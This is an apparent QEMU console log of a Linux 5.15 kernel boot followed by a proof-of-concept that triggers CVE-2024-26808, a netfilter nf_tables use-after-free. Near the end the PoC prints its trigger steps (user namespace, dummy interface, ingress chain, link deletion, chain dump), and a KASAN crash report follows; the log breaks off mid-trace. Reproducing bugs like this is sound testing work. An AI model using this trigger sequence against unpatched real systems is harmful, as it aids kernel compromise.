bash: warning: setlocale: LC_ALL: cannot change locale (en_US.UTF-8)
c[?7l[2J[0mSeaBIOS (version 1.16.2-debian-1.16.2-1)


iPXE (http://ipxe.org) 00:03.0 CA00 PCI2.10 PnP PMM+7EFCEF00+7EF0EF00 CA00
Press Ctrl-B to configure iPXE (PCI 00:03.0)...                                                                               


Booting from ROM..c[?7l[2J[    0.000000] Linux version 5.15.148+ (root@buildkitsandbox) (gcc (Debian 12.2.0-14+deb12u1) 12.2.0, GNU ld (GNU Binutils for Debian) 2.40) #1 SMP Tue May 5 13:04:45 UTC 2026
[    0.000000] Command line: console=ttyS0 oops=panic nokaslr rdinit=/init
[    0.000000] BIOS-provided physical RAM map:
[    0.000000] BIOS-e820: [mem 0x0000000000000000-0x000000000009fbff] usable
[    0.000000] BIOS-e820: [mem 0x000000000009fc00-0x000000000009ffff] reserved
[    0.000000] BIOS-e820: [mem 0x00000000000f0000-0x00000000000fffff] reserved
[    0.000000] BIOS-e820: [mem 0x0000000000100000-0x000000007ffdffff] usable
[    0.000000] BIOS-e820: [mem 0x000000007ffe0000-0x000000007fffffff] reserved
[    0.000000] BIOS-e820: [mem 0x00000000feffc000-0x00000000feffffff] reserved
[    0.000000] BIOS-e820: [mem 0x00000000fffc0000-0x00000000ffffffff] reserved
[    0.000000] NX (Execute Disable) protection: active
[    0.000000] SMBIOS 2.8 present.
[    0.000000] DMI: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.16.2-debian-1.16.2-1 04/01/2014
[    0.000000] tsc: Fast TSC calibration using PIT
[    0.000000] tsc: Detected 3186.930 MHz processor
[    0.000280] last_pfn = 0x7ffe0 max_arch_pfn = 0x400000000
[    0.000305] x86/PAT: Configuration [0-7]: WB  WC  UC- UC  WB  WP  UC- WT  
[    0.002046] found SMP MP-table at [mem 0x000f5ba0-0x000f5baf]
[    0.002056] Using GB pages for direct mapping
[    0.002057] Incomplete global flushes, disabling PCID
[    0.002177] RAMDISK: [mem 0x7fe92000-0x7ffdffff]
[    0.002182] ACPI: Early table checksum verification disabled
[    0.002185] ACPI: RSDP 0x00000000000F59D0 000014 (v00 BOCHS )
[    0.002189] ACPI: RSDT 0x000000007FFE1B33 000034 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.002194] ACPI: FACP 0x000000007FFE19DF 000074 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.002200] ACPI: DSDT 0x000000007FFE0040 00199F (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.002203] ACPI: FACS 0x000000007FFE0000 000040
[    0.002206] ACPI: APIC 0x000000007FFE1A53 000080 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.002209] ACPI: HPET 0x000000007FFE1AD3 000038 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.002212] ACPI: WAET 0x000000007FFE1B0B 000028 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.002214] ACPI: Reserving FACP table memory at [mem 0x7ffe19df-0x7ffe1a52]
[    0.002216] ACPI: Reserving DSDT table memory at [mem 0x7ffe0040-0x7ffe19de]
[    0.002217] ACPI: Reserving FACS table memory at [mem 0x7ffe0000-0x7ffe003f]
[    0.002218] ACPI: Reserving APIC table memory at [mem 0x7ffe1a53-0x7ffe1ad2]
[    0.002220] ACPI: Reserving HPET table memory at [mem 0x7ffe1ad3-0x7ffe1b0a]
[    0.002221] ACPI: Reserving WAET table memory at [mem 0x7ffe1b0b-0x7ffe1b32]
[    0.002397] No NUMA configuration found
[    0.002398] Faking a node at [mem 0x0000000000000000-0x000000007ffdffff]
[    0.002401] NODE_DATA(0) allocated [mem 0x7fe8e000-0x7fe91fff]
[    0.002411] Zone ranges:
[    0.002411]   DMA      [mem 0x0000000000001000-0x0000000000ffffff]
[    0.002413]   DMA32    [mem 0x0000000001000000-0x000000007ffdffff]
[    0.002415]   Normal   empty
[    0.002416] Movable zone start for each node
[    0.002417] Early memory node ranges
[    0.002417]   node   0: [mem 0x0000000000001000-0x000000000009efff]
[    0.002418]   node   0: [mem 0x0000000000100000-0x000000007ffdffff]
[    0.002420] Initmem setup node 0 [mem 0x0000000000001000-0x000000007ffdffff]
[    0.003294] On node 0, zone DMA: 1 pages in unavailable ranges
[    0.003337] On node 0, zone DMA: 97 pages in unavailable ranges
[    0.023109] On node 0, zone DMA32: 32 pages in unavailable ranges
[    0.378942] kasan: KernelAddressSanitizer initialized
[    0.379148] ACPI: PM-Timer IO Port: 0x608
[    0.379156] ACPI: LAPIC_NMI (acpi_id[0xff] dfl dfl lint[0x1])
[    0.379185] IOAPIC[0]: apic_id 0, version 17, address 0xfec00000, GSI 0-23
[    0.379188] ACPI: INT_SRC_OVR (bus 0 bus_irq 0 global_irq 2 dfl dfl)
[    0.379190] ACPI: INT_SRC_OVR (bus 0 bus_irq 5 global_irq 5 high level)
[    0.379191] ACPI: INT_SRC_OVR (bus 0 bus_irq 9 global_irq 9 high level)
[    0.379193] ACPI: INT_SRC_OVR (bus 0 bus_irq 10 global_irq 10 high level)
[    0.379194] ACPI: INT_SRC_OVR (bus 0 bus_irq 11 global_irq 11 high level)
[    0.379196] ACPI: Using ACPI (MADT) for SMP configuration information
[    0.379197] ACPI: HPET id: 0x8086a201 base: 0xfed00000
[    0.379201] TSC deadline timer available
[    0.379202] smpboot: Allowing 2 CPUs, 0 hotplug CPUs
[    0.379211] PM: hibernation: Registered nosave memory: [mem 0x00000000-0x00000fff]
[    0.379214] PM: hibernation: Registered nosave memory: [mem 0x0009f000-0x0009ffff]
[    0.379215] PM: hibernation: Registered nosave memory: [mem 0x000a0000-0x000effff]
[    0.379216] PM: hibernation: Registered nosave memory: [mem 0x000f0000-0x000fffff]
[    0.379217] [mem 0x80000000-0xfeffbfff] available for PCI devices
[    0.379220] clocksource: refined-jiffies: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 1910969940391419 ns
[    0.386621] setup_percpu: NR_CPUS:64 nr_cpumask_bits:64 nr_cpu_ids:2 nr_node_ids:1
[    0.389279] percpu: Embedded 64 pages/cpu s224152 r8192 d29800 u1048576
[    0.389306] Built 1 zonelists, mobility grouping on.  Total pages: 515808
[    0.389308] Policy zone: DMA32
[    0.389310] Kernel command line: console=ttyS0 oops=panic nokaslr rdinit=/init
[    0.390828] Dentry cache hash table entries: 262144 (order: 9, 2097152 bytes, linear)
[    0.390903] Inode-cache hash table entries: 131072 (order: 8, 1048576 bytes, linear)
[    0.390930] mem auto-init: stack:all(zero), heap alloc:off, heap free:off
[    0.419175] Memory: 1699988K/2096632K available (45069K kernel code, 7374K rwdata, 8152K rodata, 2032K init, 3628K bss, 396388K reserved, 0K cma-reserved)
[    0.419276] SLUB: HWalign=64, Order=0-3, MinObjects=0, CPUs=2, Nodes=1
[    0.420173] rcu: Hierarchical RCU implementation.
[    0.420176] rcu: 	RCU event tracing is enabled.
[    0.420177] rcu: 	RCU restricting CPUs from NR_CPUS=64 to nr_cpu_ids=2.
[    0.420179] rcu: RCU calculated value of scheduler-enlistment delay is 100 jiffies.
[    0.420180] rcu: Adjusting geometry for rcu_fanout_leaf=16, nr_cpu_ids=2
[    0.423302] NR_IRQS: 4352, nr_irqs: 440, preallocated irqs: 16
[    0.423500] random: crng init done
[    0.426041] Console: colour VGA+ 80x25
[    0.456905] printk: console [ttyS0] enabled
[    0.457154] ACPI: Core revision 20210730
[    0.457495] clocksource: hpet: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 19112604467 ns
[    0.458059] APIC: Switch to symmetric I/O mode setup
[    0.458897] ..TIMER: vector=0x30 apic1=0 pin1=2 apic2=-1 pin2=-1
[    0.464049] clocksource: tsc-early: mask: 0xffffffffffffffff max_cycles: 0x2df00ee6445, max_idle_ns: 440795205516 ns
[    0.464691] Calibrating delay loop (skipped), value calculated using timer frequency.. 6373.86 BogoMIPS (lpj=3186930)
[    0.465758] x86/cpu: User Mode Instruction Prevention (UMIP) activated
[    0.466185] Last level iTLB entries: 4KB 0, 2MB 0, 4MB 0
[    0.466685] Last level dTLB entries: 4KB 0, 2MB 0, 4MB 0, 1GB 0
[    0.467027] Spectre V1 : Mitigation: usercopy/swapgs barriers and __user pointer sanitization
[    0.467516] Spectre V2 : Mitigation: Enhanced IBRS
[    0.467685] Spectre V2 : Spectre v2 / SpectreRSB mitigation: Filling RSB on context switch
[    0.468161] Spectre V2 : Spectre v2 / PBRSB-eIBRS: Retire a single CALL on VMEXIT
[    0.468686] Spectre V2 : mitigation: Enabling conditional Indirect Branch Prediction Barrier
[    0.469172] Speculative Store Bypass: Mitigation: Speculative Store Bypass disabled via prctl and seccomp
[    0.469685] MMIO Stale Data: Unknown: No mitigations
[    0.469990] x86/fpu: Supporting XSAVE feature 0x001: 'x87 floating point registers'
[    0.470443] x86/fpu: Supporting XSAVE feature 0x002: 'SSE registers'
[    0.470685] x86/fpu: Supporting XSAVE feature 0x004: 'AVX registers'
[    0.471062] x86/fpu: Supporting XSAVE feature 0x200: 'Protection Keys User registers'
[    0.471688] x86/fpu: xstate_offset[2]:  576, xstate_sizes[2]:  256
[    0.472058] x86/fpu: xstate_offset[9]:  832, xstate_sizes[9]:    8
[    0.472424] x86/fpu: Enabled xstate features 0x207, context size is 840 bytes, using 'compacted' format.
[    0.485554] Freeing SMP alternatives memory: 44K
[    0.485687] pid_max: default: 32768 minimum: 301
[    0.485995] LSM: Security Framework initializing
[    0.486283] SELinux:  Initializing.
[    0.486734] Mount-cache hash table entries: 4096 (order: 3, 32768 bytes, linear)
[    0.487165] Mountpoint-cache hash table entries: 4096 (order: 3, 32768 bytes, linear)
[    0.487964] smpboot: CPU0: Intel(R) Core(TM) i9-14900K (family: 0x6, model: 0xb7, stepping: 0x1)
[    0.488786] Performance Events: unsupported p6 CPU model 183 no PMU driver, software events only.
[    0.489327] signal: max sigframe size: 3632
[    0.489599] rcu: Hierarchical SRCU implementation.
[    0.489980] smp: Bringing up secondary CPUs ...
[    0.490352] x86: Booting SMP configuration:
[    0.490605] .... node  #0, CPUs:      #1
[    0.490798] smp: Brought up 1 node, 2 CPUs
[    0.491186] smpboot: Max logical packages: 1
[    0.491444] smpboot: Total of 2 processors activated (12747.72 BogoMIPS)
[    0.491919] devtmpfs: initialized
[    0.493023] clocksource: jiffies: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 1911260446275000 ns
[    0.493688] futex hash table entries: 512 (order: 3, 32768 bytes, linear)
[    0.494173] PM: RTC time: 13:09:38, date: 2026-05-05
[    0.494574] NET: Registered PF_NETLINK/PF_ROUTE protocol family
[    0.494846] audit: initializing netlink subsys (disabled)
[    0.495701] audit: type=2000 audit(1777986578.037:1): state=initialized audit_enabled=0 res=1
[    0.495887] thermal_sys: Registered thermal governor 'step_wise'
[    0.496225] thermal_sys: Registered thermal governor 'user_space'
[    0.496614] cpuidle: using governor menu
[    0.496962] ACPI: bus type PCI registered
[    0.497317] PCI: Using configuration type 1 for base access
[    0.503456] kprobes: kprobe jump-optimization is enabled. All kprobes are optimized if possible.
[    0.503731] HugeTLB registered 2.00 MiB page size, pre-allocated 0 pages
[    0.504145] cryptomgr_test (27) used greatest stack depth: 30496 bytes left
[    0.504723] ACPI: Added _OSI(Module Device)
[    0.504975] ACPI: Added _OSI(Processor Device)
[    0.505759] ACPI: Added _OSI(3.0 _SCP Extensions)
[    0.506036] ACPI: Added _OSI(Processor Aggregator Device)
[    0.506353] ACPI: Added _OSI(Linux-Dell-Video)
[    0.506621] ACPI: Added _OSI(Linux-Lenovo-NV-HDMI-Audio)
[    0.506688] ACPI: Added _OSI(Linux-HPI-Hybrid-Graphics)
[    0.512049] ACPI: 1 ACPI AML tables successfully acquired and loaded
[    0.513673] ACPI: Interpreter enabled
[    0.513712] ACPI: PM: (supports S0 S3 S4 S5)
[    0.513962] ACPI: Using IOAPIC for interrupt routing
[    0.514272] PCI: Using host bridge windows from ACPI; if necessary, use "pci=nocrs" and report a bug
[    0.514978] ACPI: Enabled 2 GPEs in block 00 to 0F
[    0.524867] ACPI: PCI Root Bridge [PCI0] (domain 0000 [bus 00-ff])
[    0.525238] acpi PNP0A03:00: _OSC: OS supports [ASPM ClockPM Segments MSI HPX-Type3]
[    0.525726] acpi PNP0A03:00: fail to add MMCONFIG information, can't access extended PCI configuration space under this bridge.
[    0.526481] PCI host bridge to bus 0000:00
[    0.526688] pci_bus 0000:00: root bus resource [io  0x0000-0x0cf7 window]
[    0.527100] pci_bus 0000:00: root bus resource [io  0x0d00-0xffff window]
[    0.527506] pci_bus 0000:00: root bus resource [mem 0x000a0000-0x000bffff window]
[    0.527687] pci_bus 0000:00: root bus resource [mem 0x80000000-0xfebfffff window]
[    0.528125] pci_bus 0000:00: root bus resource [mem 0x100000000-0x17fffffff window]
[    0.528568] pci_bus 0000:00: root bus resource [bus 00-ff]
[    0.529119] pci 0000:00:00.0: [8086:1237] type 00 class 0x060000
[    0.533086] pci 0000:00:01.0: [8086:7000] type 00 class 0x060100
[    0.536840] pci 0000:00:01.1: [8086:7010] type 00 class 0x010180
[    0.538056] pci 0000:00:01.1: reg 0x20: [io  0xc040-0xc04f]
[    0.538796] pci 0000:00:01.1: legacy IDE quirk: reg 0x10: [io  0x01f0-0x01f7]
[    0.539207] pci 0000:00:01.1: legacy IDE quirk: reg 0x14: [io  0x03f6]
[    0.539583] pci 0000:00:01.1: legacy IDE quirk: reg 0x18: [io  0x0170-0x0177]
[    0.539686] pci 0000:00:01.1: legacy IDE quirk: reg 0x1c: [io  0x0376]
[    0.540592] pci 0000:00:01.3: [8086:7113] type 00 class 0x068000
[    0.540910] pci 0000:00:01.3: quirk: [io  0x0600-0x063f] claimed by PIIX4 ACPI
[    0.541545] pci 0000:00:01.3: quirk: [io  0x0700-0x070f] claimed by PIIX4 SMB
[    0.542431] pci 0000:00:02.0: [1234:1111] type 00 class 0x030000
[    0.543089] pci 0000:00:02.0: reg 0x10: [mem 0xfd000000-0xfdffffff pref]
[    0.544127] pci 0000:00:02.0: reg 0x18: [mem 0xfebf0000-0xfebf0fff]
[    0.546112] pci 0000:00:02.0: reg 0x30: [mem 0xfebe0000-0xfebeffff pref]
[    0.546570] pci 0000:00:02.0: Video device with shadowed ROM at [mem 0x000c0000-0x000dffff]
[    0.550166] pci 0000:00:03.0: [8086:100e] type 00 class 0x020000
[    0.551051] pci 0000:00:03.0: reg 0x10: [mem 0xfebc0000-0xfebdffff]
[    0.551687] pci 0000:00:03.0: reg 0x14: [io  0xc000-0xc03f]
[    0.553906] pci 0000:00:03.0: reg 0x30: [mem 0xfeb80000-0xfebbffff pref]
[    0.558191] ACPI: PCI: Interrupt link LNKA configured for IRQ 10
[    0.559815] ACPI: PCI: Interrupt link LNKB configured for IRQ 10
[    0.560502] ACPI: PCI: Interrupt link LNKC configured for IRQ 11
[    0.560980] ACPI: PCI: Interrupt link LNKD configured for IRQ 11
[    0.561450] ACPI: PCI: Interrupt link LNKS configured for IRQ 9
[    0.562487] iommu: Default domain type: Translated 
[    0.562686] iommu: DMA domain TLB invalidation policy: lazy mode 
[    0.563079] pci 0000:00:02.0: vgaarb: setting as boot VGA device
[    0.563079] pci 0000:00:02.0: vgaarb: VGA device added: decodes=io+mem,owns=io+mem,locks=none
[    0.563691] pci 0000:00:02.0: vgaarb: bridge control possible
[    0.564035] vgaarb: loaded
[    0.564371] SCSI subsystem initialized
[    0.564610] ACPI: bus type USB registered
[    0.564610] usbcore: registered new interface driver usbfs
[    0.564610] usbcore: registered new interface driver hub
[    0.565701] usbcore: registered new device driver usb
[    0.566045] pps_core: LinuxPPS API ver. 1 registered
[    0.566345] pps_core: Software ver. 5.3.6 - Copyright 2005-2007 Rodolfo Giometti <giometti@linux.it>
[    0.566710] PTP clock support registered
[    0.566969] Advanced Linux Sound Architecture Driver Initialized.
[    0.567943] NetLabel: Initializing
[    0.568170] NetLabel:  domain hash size = 128
[    0.568437] NetLabel:  protocols = UNLABELED CIPSOv4 CALIPSO
[    0.568745] NetLabel:  unlabeled traffic allowed by default
[    0.569109] PCI: Using ACPI for IRQ routing
[    0.569109] hpet0: at MMIO 0xfed00000, IRQs 2, 8, 0
[    0.569687] hpet0: 3 comparators, 64-bit 100.000000 MHz counter
[    0.571732] clocksource: Switched to clocksource tsc-early
[    0.599391] VFS: Disk quotas dquot_6.6.0
[    0.599656] VFS: Dquot-cache hash table entries: 512 (order 0, 4096 bytes)
[    0.600161] pnp: PnP ACPI init
[    0.601309] pnp: PnP ACPI: found 6 devices
[    0.613293] clocksource: acpi_pm: mask: 0xffffff max_cycles: 0xffffff, max_idle_ns: 2085701024 ns
[    0.613843] NET: Registered PF_INET protocol family
[    0.615598] IP idents hash table entries: 32768 (order: 6, 262144 bytes, linear)
[    0.616298] tcp_listen_portaddr_hash hash table entries: 1024 (order: 2, 16384 bytes, linear)
[    0.616807] Table-perturb hash table entries: 65536 (order: 6, 262144 bytes, linear)
[    0.617284] TCP established hash table entries: 16384 (order: 5, 131072 bytes, linear)
[    0.617775] TCP bind hash table entries: 16384 (order: 6, 262144 bytes, linear)
[    0.618231] TCP: Hash tables configured (established 16384 bind 16384)
[    0.618655] UDP hash table entries: 1024 (order: 3, 32768 bytes, linear)
[    0.619062] UDP-Lite hash table entries: 1024 (order: 3, 32768 bytes, linear)
[    0.619535] NET: Registered PF_UNIX/PF_LOCAL protocol family
[    0.621767] RPC: Registered named UNIX socket transport module.
[    0.622107] RPC: Registered udp transport module.
[    0.622381] RPC: Registered tcp transport module.
[    0.622660] RPC: Registered tcp NFSv4.1 backchannel transport module.
[    0.623577] pci_bus 0000:00: resource 4 [io  0x0000-0x0cf7 window]
[    0.623950] pci_bus 0000:00: resource 5 [io  0x0d00-0xffff window]
[    0.624318] pci_bus 0000:00: resource 6 [mem 0x000a0000-0x000bffff window]
[    0.624732] pci_bus 0000:00: resource 7 [mem 0x80000000-0xfebfffff window]
[    0.625145] pci_bus 0000:00: resource 8 [mem 0x100000000-0x17fffffff window]
[    0.625652] pci 0000:00:01.0: PIIX3: Enabling Passive Release
[    0.626006] pci 0000:00:00.0: Limiting direct PCI/PCI transfers
[    0.626370] pci 0000:00:01.0: Activating ISA DMA hang workarounds
[    0.626767] PCI: CLS 0 bytes, default 64
[    0.627214] Unpacking initramfs...
[    0.641395] Freeing initrd memory: 1336K
[    0.648409] Initialise system trusted keyrings
[    0.648748] workingset: timestamp_bits=56 max_order=19 bucket_order=0
[    0.655328] NFS: Registering the id_resolver key type
[    0.655652] Key type id_resolver registered
[    0.655910] Key type id_legacy registered
[    0.660093] Key type asymmetric registered
[    0.660384] Asymmetric key parser 'x509' registered
[    0.660731] Block layer SCSI generic (bsg) driver version 0.4 loaded (major 251)
[    0.661178] io scheduler mq-deadline registered
[    0.661453] io scheduler kyber registered
[    0.662029] input: Power Button as /devices/LNXSYSTM:00/LNXPWRBN:00/input/input0
[    0.662586] ACPI: button: Power Button [PWRF]
[    0.663162] Serial: 8250/16550 driver, 4 ports, IRQ sharing enabled
[    0.663618] 00:04: ttyS0 at I/O 0x3f8 (irq = 4, base_baud = 115200) is a 16550A
[    0.664532] Non-volatile memory driver v1.3
[    0.664813] Linux agpgart interface v0.103
[    0.669233] loop: module loaded
[    0.670363] scsi host0: ata_piix
[    0.670767] scsi host1: ata_piix
[    0.671025] ata1: PATA max MWDMA2 cmd 0x1f0 ctl 0x3f6 bmdma 0xc040 irq 14
[    0.671419] ata2: PATA max MWDMA2 cmd 0x170 ctl 0x376 bmdma 0xc048 irq 15
[    0.672478] e100: Intel(R) PRO/100 Network Driver
[    0.672764] e100: Copyright(c) 1999-2006 Intel Corporation
[    0.673098] e1000: Intel(R) PRO/1000 Network Driver
[    0.673389] e1000: Copyright (c) 1999-2006 Intel Corporation.
[    0.829464] ata2.00: ATAPI: QEMU DVD-ROM, 2.5+, max UDMA/100
[    0.831539] scsi 1:0:0:0: CD-ROM            QEMU     QEMU DVD-ROM     2.5+ PQ: 0 ANSI: 5
[    0.954096] sr 1:0:0:0: [sr0] scsi3-mmc drive: 4x/4x cd/rw xa/form2 tray
[    0.954495] cdrom: Uniform CD-ROM driver Revision: 3.20
[    0.956709] ACPI: \_SB_.LNKC: Enabled at IRQ 11
[    0.970486] sr 1:0:0:0: Attached scsi generic sg0 type 5
[    1.247986] e1000 0000:00:03.0 eth0: (PCI:33MHz:32-bit) 52:54:00:12:34:56
[    1.248402] e1000 0000:00:03.0 eth0: Intel(R) PRO/1000 Network Connection
[    1.248835] e1000e: Intel(R) PRO/1000 Network Driver
[    1.249121] e1000e: Copyright(c) 1999 - 2015 Intel Corporation.
[    1.249489] sky2: driver version 1.30
[    1.249883] ehci_hcd: USB 2.0 'Enhanced' Host Controller (EHCI) Driver
[    1.250260] ehci-pci: EHCI PCI platform driver
[    1.250529] ohci_hcd: USB 1.1 'Open' Host Controller (OHCI) Driver
[    1.250889] ohci-pci: OHCI PCI platform driver
[    1.251154] uhci_hcd: USB Universal Host Controller Interface driver
[    1.251608] usbcore: registered new interface driver usblp
[    1.251940] usbcore: registered new interface driver usb-storage
[    1.252334] i8042: PNP: PS/2 Controller [PNP0303:KBD,PNP0f13:MOU] at 0x60,0x64 irq 1,12
[    1.253258] serio: i8042 KBD port at 0x60,0x64 irq 1
[    1.253549] serio: i8042 AUX port at 0x60,0x64 irq 12
[    1.254175] input: AT Translated Set 2 keyboard as /devices/platform/i8042/serio0/input/input1
[    1.254787] rtc_cmos 00:05: RTC can wake from S4
[    1.257512] rtc_cmos 00:05: registered as rtc0
[    1.258412] rtc_cmos 00:05: alarms up to one day, y3k, 242 bytes nvram, hpet irqs
[    1.259988] device-mapper: ioctl: 4.45.0-ioctl (2021-03-22) initialised: dm-devel@redhat.com
[    1.261448] intel_pstate: CPU model not supported
[    1.262352] hid: raw HID events driver (C) Jiri Kosina
[    1.263040] usbcore: registered new interface driver usbhid
[    1.263364] usbhid: USB HID core driver
[    1.265476] Initializing XFRM netlink socket
[    1.265958] NET: Registered PF_INET6 protocol family
[    1.266692] Segment Routing with IPv6
[    1.266922] In-situ OAM (IOAM) with IPv6
[    1.267217] sit: IPv6, IPv4 and MPLS over IPv4 tunneling driver
[    1.267759] NET: Registered PF_PACKET protocol family
[    1.268074] Key type dns_resolver registered
[    1.268490] IPI shorthand broadcast: enabled
[    1.268766] sched_clock: Marking stable (1233541342, 35196513)->(1276067639, -7329784)
[    1.269301] registered taskstats version 1
[    1.269536] Loading compiled-in X.509 certificates
[    1.269914] PM:   Magic number: 10:363:179
[    1.270175] acpi device:0f: hash matches
[    1.270407] printk: console [netcon0] enabled
[    1.270656] netconsole: network logging started
[    1.271053] cfg80211: Loading compiled-in X.509 certificates for regulatory database
[    1.271610] kworker/u4:1 (71) used greatest stack depth: 29392 bytes left
[    1.272282] cfg80211: Loaded X.509 cert 'sforshee: 00b28ddf47aef9cea7'
[    1.272773] cfg80211: Loaded X.509 cert 'wens: 61c038651aabdcf94bd0ac7ff06c7248db18c600'
[    1.273248] ALSA device list:
[    1.273422]   No soundcards found.
[    1.274029] Freeing unused kernel image (initmem) memory: 2032K
[    1.274418] platform regulatory.0: Direct firmware load for regulatory.db failed with error -2
[    1.274920] cfg80211: failed to load regulatory.db
[    1.277748] Write protecting the kernel read-only data: 55296k
[    1.278390] Freeing unused kernel image (text/rodata gap) memory: 2032K
[    1.278800] Freeing unused kernel image (rodata/data gap) memory: 40K
[    1.279178] Run /init as init process
[    1.281697] mount (76) used greatest stack depth: 28744 bytes left
[    1.282329] mount (77) used greatest stack depth: 28704 bytes left

secb: rootfs ready
---- poc begin ----
poc: starting CVE-2024-26808 trigger
poc: userns ready (CAP_NET_ADMIN acquired)
poc: NETLINK_ROUTE fd=3 NETLINK_NETFILTER fd=4
poc: RTM_NEWLINK uaf0 (dummy, ifindex=1337)
poc: NFT_MSG_NEWTABLE inet t
poc: NFT_MSG_NEWCHAIN inet/ingress c dev=uaf0
poc: RTM_DELLINK uaf0 (net_device freed; hook->ops.dev dangling)
poc: NFT_MSG_GET[    1.494303] ==================================================================
CHAIN (expect KA[    1.500816] BUG: KASAN: use-after-free in strlen+0x81/0xa0
SAN use-after-fr[    1.502861] Read of size 1 at addr ffff88800969a000 by task poc/82
ee in nft_dump_b[    1.505047] 
asechain_hook)
[    1.505862] CPU: 0 PID: 82 Comm: poc Not tainted 5.15.148+ #1
[    1.508030] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.16.2-debian-1.16.2-1 04/01/2014
[    1.510900] Call Trace:
[    1.511668]  <TASK>
[    1.512333]  dump_stack_lvl+0x33/0x46
[    1.513454]  print_address_description.constprop.0+0x1f/0x1e0
[    1.515179]  ? strlen+0x81/0xa0
[    1.516145]  ? strlen+0x81/0xa0
[    1.517111]  kasan_report.cold+0x7f/0x10a
[    1.518338]  ? strlen+0x81/0xa0
[    1.519305]  strlen+0x81/0xa0
[    1.520225]  nf_tables_fill_chain_info+0x834/0x1170
[    1.521704]  ? nf_tables_newobj+0x16d0/0x16d0
[    1.522854]  ? memset+0x1f/0x40
[    1.523416]  ? __build_skb_around+0x1f4/0x2b0
[    1.524187]  nf_tables_getchain+0x303/0x690
[    1.524920]  ? nf_tables_gettable+0x620/0x620
[    1.525686]  ? unwind_next_frame+0x130e/0x1d50
[    1.526470]  ? deref_stack_reg+0xe1/0x160
[    1.527175]  ? deref_stack_reg+0xe1/0x160
[    1.527886]  ? nf_tables_gettable+0x620/0x620
[    1.528400]  nfnetlink_rcv_msg+0x42a/0x880
[    1.528840]  ? nfnetlink_net_init+0x1a0/0x1a0
[    1.529308]  ? asm_sysvec_apic_timer_interrupt+0x16/0x20
[    1.529873]  ? cred_has_capability.isra.0+0x139/0x240
[    1.530414]  netlink_rcv_skb+0x11d/0x350
[    1.530835]  ? nfnetlink_net_init+0x1a0/0x1a0
[    1.531302]  ? netlink_ack+0xa30/0xa30
[    1.531704]  ? security_capable+0x68/0xa0
[    1.532137]  nfnetlink_rcv+0x147/0x360
[    1.532542]  ? nfnetlink_rcv_batch+0x2010/0x2010
[    1.533033]  ? _copy_from_iter+0x1e0/0xfa0
[    1.533475]  netlink_unicast+0x574/0x7e0
[    1.533896]  ? netlink_attachskb+0x6a0/0x6a0
[    1.534197]  ? __build_skb_around+0x1f4/0x2b0
[    1.534450]  netlink_sendmsg+0x79f/0xc50
[    1.534679]  ? netlink_unicast+0x7e0/0x7e0
[    1.534917]  ? netlink_unicast+0x7e0/0x7e0
[    1.535155]  __sock_sendmsg+0xdf/0x110
[    1.535376]  ____sys_sendmsg+0x5bd/0x7c0
[    1.535604]  ? sock_write_iter+0x370/0x370
[    1.535842]  ? do_recvmmsg+0x570/0x570
[    1.536061]  ? __wake_up_common+0x3f0/0x3f0
[    1.536307]  ___sys_sendmsg+0xfb/0x170
[    1.536526]  ? sendmsg_copy_msghdr+0x120/0x120
[    1.536783]  ? ldsem_up_read+0xe/0x40
[    1.536998]  ? file_tty_write.constprop.0+0x4da/0x7a0
[    1.537293]  ? __cond_resched+0x12/0x80
[    1.537522]  ? __fget_light+0x4c/0x230
[    1.537746]  __sys_sendmsg+0xd0/0x170
[    1.537963]  ? __sys_sendmsg_sock+0x20/0x20
[    1.538211]  ? vfs_write+0x34a/0x770
[    1.538423]  ? fpregs_assert_state_consistent+0x18/0xa0
[    1.538730]  do_syscall_64+0x37/0x90
[    1.538942]  entry_SYSCALL_64_after_hwframe+0x62/0xcc
[    1.539241] RIP: 0033:0x43ba20
[    1.539425] Code: ff f7 d8 48 c7 c3 ff ff ff ff 64 89 02 eb bd 66 2e 0f 1f 84 00 00 00 00 00 90 80 3d 41 c6 06 00 00 74 17 b8 2e 00 00 00 0f 05 <48> 3d 00 f0 ff ff 77 58 c3 0f 1f 80 00 00 00 00 48 83 ec 28 89 54
[    1.540498] RSP: 002b:00007ffd4c4b5ea8 EFLAGS: 00000202 ORIG_RAX: 000000000000002e
[    1.540947] RAX: ffffffffffffffda RBX: 0000000000000004 RCX: 000000000043ba20
[    1.541363] RDX: 0000000000000000 RSI: 00007ffd4c4b5ed0 RDI: 0000000000000004
[    1.541771] RBP: 00007ffd4c4b5ed0 R08: 000000000000002e R09: 00007ffd4c4b60d7
[    1.542179] R10: 0000000000000000 R11: 0000000000000202 R12: 000000000047b042
[    1.542588] R13: 0000000000000003 R14: 00007ffd4c4b5f10 R15: 0000000000000001
[    1.542995]  </TASK>
[    1.543126] 
[    1.543218] Allocated by task 82:
[    1.543413]  kasan_save_stack+0x2a/0x50
[    1.543639]  __kasan_kmalloc+0x7f/0xb0
[    1.543865]  alloc_netdev_mqs+0x5b/0xdf0
[    1.544102]  rtnl_create_link+0x889/0xbd0
[    1.544341]  __rtnl_newlink+0xc78/0x14f0
[    1.544569]  rtnl_newlink+0x59/0x90
[    1.544773]  rtnetlink_rcv_msg+0x526/0x9a0
[    1.545011]  netlink_rcv_skb+0x11d/0x350
[    1.545246]  netlink_unicast+0x574/0x7e0
[    1.545492]  netlink_sendmsg+0x79f/0xc50
[    1.545723]  __sock_sendmsg+0xdf/0x110
[    1.545941]  ____sys_sendmsg+0x5bd/0x7c0
[    1.546168]  ___sys_sendmsg+0xfb/0x170
[    1.546387]  __sys_sendmsg+0xd0/0x170
[    1.546600]  do_syscall_64+0x37/0x90
[    1.546807]  entry_SYSCALL_64_after_hwframe+0x62/0xcc
[    1.547098] 
[    1.547190] Freed by task 82:
[    1.547363]  kasan_save_stack+0x2a/0x50
[    1.547586]  kasan_set_track+0x1c/0x30
[    1.547803]  kasan_set_free_info+0x20/0x40
[    1.548040]  __kasan_slab_free+0xe9/0x120
[    1.548272]  kfree+0x8f/0x210
[    1.548453]  device_release+0x93/0x210
[    1.548674]  kobject_put+0x14a/0x280
